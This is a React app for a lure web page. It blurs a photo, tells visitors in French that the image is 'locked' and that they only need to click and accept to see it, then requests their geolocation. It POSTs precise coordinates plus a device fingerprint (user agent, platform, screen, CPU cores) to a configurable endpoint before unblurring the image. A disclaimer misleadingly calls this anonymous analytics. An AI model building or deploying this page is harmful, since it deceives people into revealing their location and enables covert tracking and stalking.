import React, { useState } from "react";

const API_URL = "https://your-api.com/analytics"; // replace with your endpoint

const IMAGE_URL =
  "https://img.freepik.com/free-photo/woman-home-embracing-big-teddy-bear_23-2148832938.jpg?semt=ais_rp_progressive&w=740&q=80";

const App: React.FC = () => {
  const [revealed, setRevealed] = useState(false);
  const [loading, setLoading] = useState(false);
  const [dataSent, setDataSent] = useState(false);

  const requestLocationAndSendData = () => {
    if (!navigator.geolocation) {
      alert("Geolocation not supported");
      return;
    }

    setLoading(true);

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const data = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          browser: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: {
            width: window.screen.width,
            height: window.screen.height,
            colorDepth: window.screen.colorDepth,
          },
          cpuCores: navigator.hardwareConcurrency,
          maxTouchPoints: navigator.maxTouchPoints,
          timestamp: new Date().toISOString(),
        };

        try {
          await fetch(API_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
          });
          setDataSent(true);
        } catch (err) {
          console.error("Failed to send data", err);
        }

        setLoading(false);
        setRevealed(true);
      },
      () => {
        setLoading(false);
        alert("Location permission denied.");
      }
    );
  };

  return (
    <div style={containerStyle}>
      {/* Full-screen image — always rendered, blur toggled */}
      <img
        src={IMAGE_URL}
        alt="reveal"
        style={{
          ...bgImageStyle,
          filter: revealed
            ? "none"
            : "blur(28px) brightness(0.75) saturate(0.6)",
          transform: revealed ? "scale(1)" : "scale(1.08)",
          transition:
            "filter 1.2s cubic-bezier(0.4,0,0.2,1), transform 1.4s cubic-bezier(0.4,0,0.2,1)",
        }}
      />

      {/* Dark vignette overlay — fades out on reveal */}
      <div
        style={{
          ...vignetteStyle,
          opacity: revealed ? 0 : 1,
          transition: "opacity 1.2s ease",
          pointerEvents: "none",
        }}
      />

      {/* Lock UI — slides down and fades out on reveal */}
      {!revealed && (
        <div style={lockPanelStyle}>
          {/* Lock icon */}
          <div style={lockIconStyle}>
            <svg
              width="36"
              height="36"
              viewBox="0 0 24 24"
              fill="none"
              stroke="white"
              strokeWidth="1.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
              <path d="M7 11V7a5 5 0 0 1 10 0v4" />
            </svg>
          </div>

          <h1 style={titleStyle}>L'image est verouillee</h1>
          <p style={subtitleStyle}>
            Cliquez juste sur le bouton puis accepter pour voir l'image.
          </p>

          <button
            style={{
              ...buttonStyle,
              opacity: loading ? 0.7 : 1,
              transform: loading ? "scale(0.97)" : "scale(1)",
            }}
            onClick={requestLocationAndSendData}
            disabled={loading}
          >
            {loading ? (
              <span style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <SpinnerIcon />
                En attente…
              </span>
            ) : (
              <span style={{ display: "flex", alignItems: "center", gap: 10 }}>
                Voir l'image
              </span>
            )}
          </button>

          <p style={disclaimerStyle}>
            Vos donnees sont collectees a des fins d'analyses anonymes.
          </p>
        </div>
      )}

      {/* Success toast */}
      {revealed && dataSent && (
        <div style={toastStyle}>
          <span style={{ fontSize: 16 }}>📍</span>
          Location captured &amp; data sent
        </div>
      )}
    </div>
  );
};

/* ── Inline SVG icons ─────────────────────────────────────────── */
const PinIcon = () => (
  <svg
    width="18"
    height="18"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z" />
    <circle cx="12" cy="9" r="2.5" />
  </svg>
);

const SpinnerIcon = () => (
  <svg
    width="18"
    height="18"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2.5"
    strokeLinecap="round"
    style={{ animation: "spin 0.8s linear infinite" }}
  >
    <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" />
  </svg>
);

/* ── Styles ───────────────────────────────────────────────────── */
const containerStyle: React.CSSProperties = {
  position: "relative",
  width: "100vw",
  height: "100vh",
  overflow: "hidden",
  fontFamily: "'Georgia', 'Times New Roman', serif",
  backgroundColor: "#0a0a0a",
};

const bgImageStyle: React.CSSProperties = {
  position: "absolute",
  inset: 0,
  width: "100%",
  height: "100%",
  objectFit: "cover",
  display: "block",
  willChange: "filter, transform",
};

const vignetteStyle: React.CSSProperties = {
  position: "absolute",
  inset: 0,
  background:
    "radial-gradient(ellipse at center, rgba(0,0,0,0.25) 0%, rgba(0,0,0,0.72) 100%)",
};

const lockPanelStyle: React.CSSProperties = {
  position: "absolute",
  inset: 0,
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
  gap: 16,
  padding: "0 24px",
  textAlign: "center",
  animation: "fadeUp 0.6s ease both",
};

const lockIconStyle: React.CSSProperties = {
  width: 72,
  height: 72,
  borderRadius: "50%",
  background: "rgba(255,255,255,0.12)",
  backdropFilter: "blur(8px)",
  border: "1px solid rgba(255,255,255,0.25)",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  marginBottom: 8,
};

const titleStyle: React.CSSProperties = {
  margin: 0,
  fontSize: "clamp(22px, 4vw, 36px)",
  fontWeight: 400,
  color: "#ffffff",
  letterSpacing: "-0.02em",
  textShadow: "0 2px 12px rgba(0,0,0,0.5)",
};

const subtitleStyle: React.CSSProperties = {
  margin: 0,
  fontSize: "clamp(14px, 2vw, 17px)",
  color: "rgba(255,255,255,0.65)",
  fontFamily: "'Helvetica Neue', Arial, sans-serif",
  fontWeight: 300,
  maxWidth: 360,
  lineHeight: 1.55,
};

const buttonStyle: React.CSSProperties = {
  marginTop: 12,
  padding: "14px 28px",
  fontSize: 15,
  fontFamily: "'Helvetica Neue', Arial, sans-serif",
  fontWeight: 500,
  letterSpacing: "0.01em",
  borderRadius: 50,
  border: "none",
  cursor: "pointer",
  background: "rgba(255,255,255,0.95)",
  color: "#111",
  boxShadow: "0 4px 24px rgba(0,0,0,0.3), 0 1px 3px rgba(0,0,0,0.2)",
  transition: "opacity 0.2s, transform 0.2s, box-shadow 0.2s",
  display: "flex",
  alignItems: "center",
};

const disclaimerStyle: React.CSSProperties = {
  fontSize: 12,
  color: "rgba(255,255,255,0.35)",
  fontFamily: "'Helvetica Neue', Arial, sans-serif",
  maxWidth: 320,
  lineHeight: 1.5,
  marginTop: 4,
};

const toastStyle: React.CSSProperties = {
  position: "fixed",
  bottom: 32,
  left: "50%",
  transform: "translateX(-50%)",
  background: "rgba(20,20,20,0.85)",
  backdropFilter: "blur(12px)",
  color: "#fff",
  padding: "12px 20px",
  borderRadius: 50,
  fontSize: 14,
  fontFamily: "'Helvetica Neue', Arial, sans-serif",
  display: "flex",
  alignItems: "center",
  gap: 8,
  boxShadow: "0 4px 20px rgba(0,0,0,0.35)",
  animation: "fadeUp 0.5s ease both",
  border: "1px solid rgba(255,255,255,0.12)",
};

export default App;
